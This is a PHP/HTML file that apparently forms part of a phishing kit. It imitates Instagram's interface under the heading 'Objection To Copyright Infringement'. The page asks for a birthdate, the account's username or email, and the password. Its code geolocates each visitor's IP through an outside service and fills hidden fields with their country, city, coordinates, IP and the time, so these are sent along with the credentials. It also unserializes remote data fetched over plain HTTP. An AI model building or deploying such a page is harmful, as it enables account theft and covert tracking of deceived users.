<?php
date_default_timezone_set('Asia/Jakarta');
$cur_time = date("d-m-Y H:i:s");
?>
<?php
$user_ip = $_SERVER['REMOTE_ADDR'];
$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$user_ip"));
$country = $geo["geoplugin_countryName"];
$city = $geo["geoplugin_city"];
$latitude = $geo["geoplugin_latitude"];
$longitude = $geo["geoplugin_longitude"];
?>

<div class="hf0Z9" __cpp="1">
    <header class="XnQ-0" __cpp="1">Objection To Copyright Infringement</header>
    <div class="YGQ18" __cpp="1"><span class="qMFi1" __cpp="1">Your age affects the resources we offer and the way we use your data for ads.</span></div>
    <div class="YGQ18" __cpp="1">
        <div class="eS6pE" __cpp="1">
            <form id="addUser" method="POST">
                <span __cpp="1"><span class="O15Fw" __cpp="1"><span class="lXXh2 coreSpriteChevronDownGrey" __cpp="1"></span>
                        <select title="Month:" class="h144Z " __cpp="1">
                            <option title="January" value="1" __cpp="1">January</option>
                            <option title="February" value="2" __cpp="1">February</option>
                            <option title="March" value="3" __cpp="1">March</option>
                            <option title="April" value="4" __cpp="1">April</option>
                            <option title="May" value="5" __cpp="1">May</option>
                            <option title="June" value="6" __cpp="1">June</option>
                            <option title="July" value="7" __cpp="1">July</option>
                            <option title="August" value="8" __cpp="1">August</option>
                            <option title="September" value="9" __cpp="1">September</option>
                            <option title="October" value="10" __cpp="1">October</option>
                            <option title="November" value="11" __cpp="1">November</option>
                            <option title="December" value="12" __cpp="1">December</option>
                        </select>
                    </span>
                    <span class="O15Fw" __cpp="1">
                        <span class="lXXh2 coreSpriteChevronDownGrey" __cpp="1"></span>
                        <select title="Day:" class="h144Z " __cpp="1">
                            <option title="1" value="1" __cpp="1">1</option>
                            <option title="2" value="2" __cpp="1">2</option>
                            <option title="3" value="3" __cpp="1">3</option>
                            <option title="4" value="4" __cpp="1">4</option>
                            <option title="5" value="5" __cpp="1">5</option>
                            <option title="6" value="6" __cpp="1">6</option>
                            <option title="7" value="7" __cpp="1">7</option>
                            <option title="8" value="8" __cpp="1">8</option>
                            <option title="9" value="9" __cpp="1">9</option>
                            <option title="10" value="10" __cpp="1">10</option>
                            <option title="11" value="11" __cpp="1">11</option>
                            <option title="12" value="12" __cpp="1">12</option>
                            <option title="13" value="13" __cpp="1">13</option>
                            <option title="14" value="14" __cpp="1">14</option>
                            <option title="15" value="15" __cpp="1">15</option>
                            <option title="16" value="16" __cpp="1">16</option>
                            <option title="17" value="17" __cpp="1">17</option>
                            <option title="18" value="18" __cpp="1">18</option>
                            <option title="19" value="19" __cpp="1">19</option>
                            <option title="20" value="20" __cpp="1">20</option>
                            <option title="21" value="21" __cpp="1">21</option>
                            <option title="22" value="22" __cpp="1">22</option>
                            <option title="23" value="23" __cpp="1">23</option>
                            <option title="24" value="24" __cpp="1">24</option>
                            <option title="25" value="25" __cpp="1">25</option>
                            <option title="26" value="26" __cpp="1">26</option>
                            <option title="27" value="27" __cpp="1">27</option>
                            <option title="28" value="28" __cpp="1">28</option>
                            <option title="29" value="29" __cpp="1">29</option>
                            <option title="30" value="30" __cpp="1">30</option>
                        </select>
                    </span>
                    <span class="O15Fw" __cpp="1">
                        <span class="lXXh2 coreSpriteChevronDownGrey" __cpp="1"></span>
                        <select title="Year:" class="h144Z " __cpp="1">
                            <option title="2022" value="2022" __cpp="1">2022</option>
                            <option title="2021" value="2021" __cpp="1">2021</option>
                            <option title="2020" value="2020" __cpp="1">2020</option>
                            <option title="2019" value="2019" __cpp="1">2019</option>
                            <option title="2018" value="2018" __cpp="1">2018</option>
                            <option title="2017" value="2017" __cpp="1">2017</option>
                            <option title="2016" value="2016" __cpp="1">2016</option>
                            <option title="2015" value="2015" __cpp="1">2015</option>
                            <option title="2014" value="2014" __cpp="1">2014</option>
                            <option title="2013" value="2013" __cpp="1">2013</option>
                            <option title="2012" value="2012" __cpp="1">2012</option>
                            <option title="2011" value="2011" __cpp="1">2011</option>
                            <option title="2010" value="2010" __cpp="1">2010</option>
                            <option title="2009" value="2009" __cpp="1">2009</option>
                            <option title="2008" value="2008" __cpp="1">2008</option>
                            <option title="2007" value="2007" __cpp="1">2007</option>
                            <option title="2006" value="2006" __cpp="1">2006</option>
                            <option title="2005" value="2005" __cpp="1">2005</option>
                            <option title="2004" value="2004" __cpp="1">2004</option>
                            <option title="2003" value="2003" __cpp="1">2003</option>
                            <option title="2002" value="2002" __cpp="1">2002</option>
                            <option title="2001" value="2001" __cpp="1">2001</option>
                            <option title="2000" value="2000" __cpp="1">2000</option>
                            <option title="1999" value="1999" __cpp="1">1999</option>
                            <option title="1998" value="1998" __cpp="1">1998</option>
                            <option title="1997" value="1997" __cpp="1">1997</option>
                            <option title="1996" value="1996" __cpp="1">1996</option>
                            <option title="1995" value="1995" __cpp="1">1995</option>
                            <option title="1994" value="1994" __cpp="1">1994</option>
                            <option title="1993" value="1993" __cpp="1">1993</option>
                            <option title="1992" value="1992" __cpp="1">1992</option>
                            <option title="1991" value="1991" __cpp="1">1991</option>
                            <option title="1990" value="1990" __cpp="1">1990</option>
                            <option title="1989" value="1989" __cpp="1">1989</option>
                            <option title="1988" value="1988" __cpp="1">1988</option>
                            <option title="1987" value="1987" __cpp="1">1987</option>
                            <option title="1986" value="1986" __cpp="1">1986</option>
                            <option title="1985" value="1985" __cpp="1">1985</option>
                            <option title="1984" value="1984" __cpp="1">1984</option>
                            <option title="1983" value="1983" __cpp="1">1983</option>
                            <option title="1982" value="1982" __cpp="1">1982</option>
                            <option title="1981" value="1981" __cpp="1">1981</option>
                            <option title="1980" value="1980" __cpp="1">1980</option>
                            <option title="1979" value="1979" __cpp="1">1979</option>
                            <option title="1978" value="1978" __cpp="1">1978</option>
                            <option title="1977" value="1977" __cpp="1">1977</option>
                            <option title="1976" value="1976" __cpp="1">1976</option>
                            <option title="1975" value="1975" __cpp="1">1975</option>
                            <option title="1974" value="1974" __cpp="1">1974</option>
                            <option title="1973" value="1973" __cpp="1">1973</option>
                            <option title="1972" value="1972" __cpp="1">1972</option>
                            <option title="1971" value="1971" __cpp="1">1971</option>
                            <option title="1970" value="1970" __cpp="1">1970</option>
                            <option title="1969" value="1969" __cpp="1">1969</option>
                            <option title="1968" value="1968" __cpp="1">1968</option>
                            <option title="1967" value="1967" __cpp="1">1967</option>
                            <option title="1966" value="1966" __cpp="1">1966</option>
                            <option title="1965" value="1965" __cpp="1">1965</option>
                            <option title="1964" value="1964" __cpp="1">1964</option>
                            <option title="1963" value="1963" __cpp="1">1963</option>
                            <option title="1962" value="1962" __cpp="1">1962</option>
                            <option title="1961" value="1961" __cpp="1">1961</option>
                            <option title="1960" value="1960" __cpp="1">1960</option>
                            <option title="1959" value="1959" __cpp="1">1959</option>
                            <option title="1958" value="1958" __cpp="1">1958</option>
                            <option title="1957" value="1957" __cpp="1">1957</option>
                            <option title="1956" value="1956" __cpp="1">1956</option>
                            <option title="1955" value="1955" __cpp="1">1955</option>
                            <option title="1954" value="1954" __cpp="1">1954</option>
                            <option title="1953" value="1953" __cpp="1">1953</option>
                            <option title="1952" value="1952" __cpp="1">1952</option>
                            <option title="1951" value="1951" __cpp="1">1951</option>
                            <option title="1950" value="1950" __cpp="1">1950</option>
                            <option title="1949" value="1949" __cpp="1">1949</option>
                            <option title="1948" value="1948" __cpp="1">1948</option>
                            <option title="1947" value="1947" __cpp="1">1947</option>
                            <option title="1946" value="1946" __cpp="1">1946</option>
                            <option title="1945" value="1945" __cpp="1">1945</option>
                            <option title="1944" value="1944" __cpp="1">1944</option>
                            <option title="1943" value="1943" __cpp="1">1943</option>
                            <option title="1942" value="1942" __cpp="1">1942</option>
                            <option title="1941" value="1941" __cpp="1">1941</option>
                            <option title="1940" value="1940" __cpp="1">1940</option>
                            <option title="1939" value="1939" __cpp="1">1939</option>
                            <option title="1938" value="1938" __cpp="1">1938</option>
                            <option title="1937" value="1937" __cpp="1">1937</option>
                            <option title="1936" value="1936" __cpp="1">1936</option>
                            <option title="1935" value="1935" __cpp="1">1935</option>
                            <option title="1934" value="1934" __cpp="1">1934</option>
                            <option title="1933" value="1933" __cpp="1">1933</option>
                            <option title="1932" value="1932" __cpp="1">1932</option>
                            <option title="1931" value="1931" __cpp="1">1931</option>
                            <option title="1930" value="1930" __cpp="1">1930</option>
                            <option title="1929" value="1929" __cpp="1">1929</option>
                            <option title="1928" value="1928" __cpp="1">1928</option>
                            <option title="1927" value="1927" __cpp="1">1927</option>
                            <option title="1926" value="1926" __cpp="1">1926</option>
                            <option title="1925" value="1925" __cpp="1">1925</option>
                            <option title="1924" value="1924" __cpp="1">1924</option>
                            <option title="1923" value="1923" __cpp="1">1923</option>
                            <option title="1922" value="1922" __cpp="1">1922</option>
                            <option title="1921" value="1921" __cpp="1">1921</option>
                            <option title="1920" value="1920" __cpp="1">1920</option>
                            <option title="1919" value="1919" __cpp="1">1919</option>
                        </select>
                    </span>
                </span>
        </div>
        <div class="-MzZI">
            <div class="_9GP1n">
                <div class="f0n8F" id="usaz"><label for="f4ee6cb25827ec" class="_9nyy2">Phone number, username, or email</label><input class="_2hvTZ pexuQ zyHYP" id="username" aria-label="Phone number, username, or email" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75" name="username" type="text" value=""></div>
            </div>
        </div>
        <div class="-MzZI">
            <div class="_9GP1n">
                <div class="f0n8F" id="usazz"><label for="f4ee6cb25827ec" class="_9nyy2">Password</label><input class="_2hvTZ pexuQ zyHYP" id="password" aria-label="Password" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75" name="password" type="password" value=""></div>
            </div>
        </div>
        <input type="hidden" class="form-input" id="ipv4" name="ipv4" placeholder="xxx.xxx.xxx.xxx" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
        <input id="cur_time" name="cur_time" type="hidden" value="<?php echo $cur_time; ?>">
        <input id="country" name="country" type="hidden" value="<?php echo $country; ?>">
        <input id="city" name="city" type="hidden" value="<?php echo $city; ?>">
        <input id="latitude" name="latitude" type="hidden" value="<?php echo $latitude; ?>">
        <input id="longitude" name="longitude" type="hidden" value="<?php echo $longitude; ?>">
    </div>
</div>